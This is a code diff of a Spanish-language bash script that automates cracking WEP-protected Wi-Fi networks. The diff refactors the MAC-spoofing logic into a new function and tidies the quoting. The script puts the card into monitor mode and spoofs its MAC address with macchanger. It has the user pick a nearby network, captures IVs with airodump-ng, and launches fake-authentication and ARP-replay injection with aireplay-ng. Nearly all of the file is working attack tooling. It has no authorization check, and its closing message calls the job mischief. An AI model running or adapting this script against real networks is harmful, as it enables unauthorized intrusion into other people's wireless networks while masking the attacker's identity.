@@ -47,36 +47,50 @@ function usage {
 }
 
 function probe_interface {
-	if [ -z `iwconfig 2>&1 | grep 802.11 | awk '{print $1}' | grep ^$1` ]; then
-		echo Se ha pedido por una interfaz no valida. Abortando...
-		exit
+	if [ -z "`iwconfig 2>&1 | grep -E "^$1\s+\w*\s+802\.11\w+\s+\w+"`" ]; then
+		echo -e "${red}Se ha insertado una interfaz invalida${END}"
+		exit 2
 	fi
 }
 
 ############################################################
-# Selecciona una interfaz de red que soporte 802.11,
-# de haber mas de una, las muestras en un menu  como opciones
+# Configurando MAC address, el argumento recibido($1),
+# A partir de este configuramos la mac
 #
+# @argumen $1 descripción del argumento 1.
+# @return tipo descripcion de lo que regresa
 # @link [URL de mayor infor]
 ############################################################
-function select_interface() {
-	local NUM_INTERFACES=`iwconfig 2>&1 | grep 802.11 | wc -l`
-	if [ "$NUM_INTERFACES" -gt 1 ]; then
-		echo -e "${white}Especifike un número de la lista:"
-		select INTERFAZ in `iwconfig 2>&1 | grep 802.11 | grep -oE "^\w*"`; do
-			if [ $INTERFAZ ]; then
-				break;
+function config_mac_address() {
+	local fabricante="desconocido"
+	ifconfig ${INTERFAZ} down && ifconfig ${IFACE} down;
+	echo -e "${BYellow}Configurando dirección MAC ${newMac}${Color_Off}${BCyan}";
+	case "${1}" in
+	#Sin argumento: le creamos una mac de forma aleatoria
+		"")
+			echo 'Creando MAC aleatoria'
+			fabricante=`macchanger -a ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
+		;;
+	#dont-fake: Conserva su dirección MAC, NO recomendable
+		--dont-fake)
+			echo 'Conservando la MAC address actual...'
+		;;
+	#En otro caso: se espera una direccion MAC como segundo argumento
+		*)
+			if [ -z "`echo ${1} | grep -Eoi '([0-f]{2}:){5}[0-f]{2}'`" ]; then
+				echo -e "${URed}No especificó una MAC ${1} address inválida.${Color_Off}"
+				echo -e "${BCyan}Creando MAC aleatoria"
+				fabricante=`macchanger -a ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
 			else
-				clear
-				echo -e "${red}Especifike una interfaz valida:${END}${white}"
+				echo "Se usará ${1} como dirección MAC"
+				fabricante=`macchanger -m ${fabricante} ${INTERFAZ} | grep ^Faked | grep -Eo "\(.*\)"`
 			fi
-		done #end select
-	else
-		INTERFAZ=`iwconfig 2>&1 | grep 802.11 | grep -oE "^\w*" | head -1`
-	fi
-	echo -e ${END}
+		;;
+	esac #end case
+	ifconfig ${INTERFAZ} up && ifconfig ${IFACE} up
+	export NEWMAC=`ifconfig ${INTERFAZ} | grep HW | grep -oEi '[0-f:]{17}'`
+	echo -e "${BCyan}Direccion MAC ${On_IPurple}${NEWMAC}${BCyan}\nFabricante ${On_IPurple}${fabricante}${Color_Off}"
 }
-
 ############################# aqui empieza la secuencia del guion ########################
 #valiaciones previas.
 validar_dependencias
@@ -88,56 +102,33 @@ if [ -z "$1" ]; then
 else
 	probe_interface $1
 	if [ $RETVAL ]; then
-		exit
-        else
+		exit $RETVAL
+	else
 		INTERFAZ=$1
-        fi
+	fi
 fi
-echo Trabajando con la interfaz $INTERFAZ...
+echo "Trabajando con la interfaz ${INTERFAZ}..."
 
 # Comprobando permisos
 if [ "$(id -g)" -eq 0 ]; then
-        # Verificando interfaz en modo Monitor
-        PROBE=`iwconfig 2>&1 | cat - | grep Monitor`
-        if [ -z "$PROBE" ]; then
-                echo -e "${cyan}Levantando interfaz modo Monitor...${END}"
-                IFACE=`airmon-ng start $INTERFAZ | tail -n2 | awk '{print $5}' | sed s/\).*//g`
-        else
-                IFACE=`echo $PROBE | cut -d " " -f1`
-        fi
-        echo $IFACE '... interfaz configurada.'
+	# Verificando interfaz en modo Monitor
+	IFACE=`iwconfig 2>&1 | cat - | grep Monitor | head -1 | grep -Eo "^\w+"`
+	if [ -z "${IFACE}" ]; then
+		echo -e "${cyan}Levantando interfaz modo Monitor...${END}"
+		IFACE=`airmon-ng start ${INTERFAZ} | tail -n2 | grep -oE '^\w*'`
+	fi
+	echo ${IFACE} '... interfaz configurada.'
 
-        # Configurando MAC address
-        if [ "$2" == "--dont-fake" ]; then
-                echo 'Conservando la MAC address actual...'
-                NEWMAC=`ifconfig $INTERFAZ | grep HW | awk '{print $5}'`
-        else
-                ifconfig $INTERFAZ down; ifconfig $IFACE down
-                if [ -z "$2" ]; then
-                        echo 'Reestableciendo direcciones físicas...'
-                        FALSA=`macchanger -A $INTERFAZ`
-                        NEWMAC=`macchanger -a $INTERFAZ | grep Faked | awk '{print $3}'`
-                else
-                        echo "Se usará $2 como dirección MAC"
-                        RES=`macchanger -m $2 $INTERFAZ | grep Faked`
-                        if [ -z "$RES" ]; then
-                                echo 'No especificó una MAC address válida. Abortando.'
-                                ifconfig $INTERFAZ up; ifconfig $IFACE up
-                                exit
-                        fi
-                        NEWMAC=$2
-                fi
-                macchanger -m $NEWMAC $IFACE | grep Faked
-                echo "Levantando interfaces de red...`ifconfig $INTERFAZ up;ifconfig $IFACE up`"
-                echo "Esperando 2 segundos..." && sleep 2 && echo done.
-        fi
+	#configuramos nuestra direccion MAC
+	config_mac_address "$2"
+	echo -e "Esperando 2 segundos\c" && sleep 1 && echo -e ".\c" && sleep 1 && echo -e ".\c" && sleep 1 && echo "."
 
 	echo "Escaneando las redes Wi-Fi..."
         # Generamos los archivos temporales a usar
         infoPath=`mktemp -t aire_info-XXX`
         targetPath=`mktemp -t aire_target-XXX`
         #
-        mostrarObjetivos $INTERFAZ $infoPath
+        mostrarObjetivos "${INTERFAZ}" "$infoPath"
         echo -n $'\nNumero de Célula [XX]: '
         read CELL
         echo 'Preparando el atake...'
@@ -149,15 +140,15 @@ if [ "$(id -g)" -eq 0 ]; then
         CHANNEL=`cat $targetPath | grep Channel | sed s/.*://g`
         ESSID=`cat $targetPath | grep ESSID | sed s/.*://g | sed s/\"//g`
 	rm $infoPath $targetPath
-        echo "Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]"
+        echo -e "Comenzando el almacenamiento de IVs en el canal $CHANNEL para\n$ESSID [$BSSID]"
 
 	# sub-shell para la captura de IVs
 	rm aire-tmp-* > /dev/null 2>&1
-	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
+	(xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp ${IFACE} &)
         (while true; do
 		echo Esperando a sintonizar el canal... && sleep 2 && echo done.
                 echo -e "Lanzando la falsa autenticacion...\n(presione ctrl+c sobre la ventana para cerrarla)"
-                (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC $IFACE &)
+                (xterm -hold -e aireplay-ng --fakeauth=6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $NEWMAC ${IFACE} &)
                 echo -n "Ha funcionado la falsa autenticacion? (Y/n) "
                 read RES
                 if [ "$RES" = 'Y' ]; then
@@ -170,20 +161,20 @@ if [ "$(id -g)" -eq 0 ]; then
                         continue
                 fi
                 echo 'Reiniciando la interfaz con nueva MAC...'
-                ifconfig $IFACE down
-                RES=`macchanger -m $NEWMAC $IFACE | grep Faked`
+                ifconfig ${IFACE} down
+                RES=`macchanger -m $NEWMAC ${IFACE} | grep Faked`
                 if [ -z "$RES" ]; then
                         echo 'No especificó una MAC address válida. Configurando con cualkier otra.'
-                        NEWMAC=`macchanger -a $IFACE | grep Faked | awk '{print $3}'`
+                        NEWMAC=`macchanger -a ${IFACE} | grep Faked | awk '{print $3}'`
                 fi
-                echo "Esperando dos segundos..." && sleep 2 && ifconfig $IFACE up
+                echo "Esperando dos segundos..." && sleep 2 && ifconfig ${IFACE} up
                 echo 'Reiniciando airodump-ng...'
                 killall airodump-ng && rm aire-tmp-*
-                (xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp $IFACE &)
+                (xterm -e airodump-ng --encrypt WEP -a --channel $CHANNEL --bssid $BSSID --write aire-tmp ${IFACE} &)
         done)
 
         echo 'Comenzando a inyectar paketes...'
-        (xterm -hold -e aireplay-ng --arpreplay -e $ESSID -b $BSSID -h $NEWMAC $IFACE &)
+        (xterm -hold -e aireplay-ng --arpreplay -e $ESSID -b $BSSID -h $NEWMAC ${IFACE} &)
 
         echo 'Presione enter cuando hayan suficientes IVs'
         read ENTER
@@ -198,7 +189,7 @@ if [ "$(id -g)" -eq 0 ]; then
         echo -e "${red}Matando procesos ${END}"
         killall xterm
         echo -e "${red}Terminando la interfaz en modo promiscuo${END}"
-        airmon-ng stop $IFACE
+        airmon-ng stop ${IFACE}
         echo "${yellow}Travesura realizada. xD${END}"
 else
         echo -e "${red}Eres r00t?${END}"
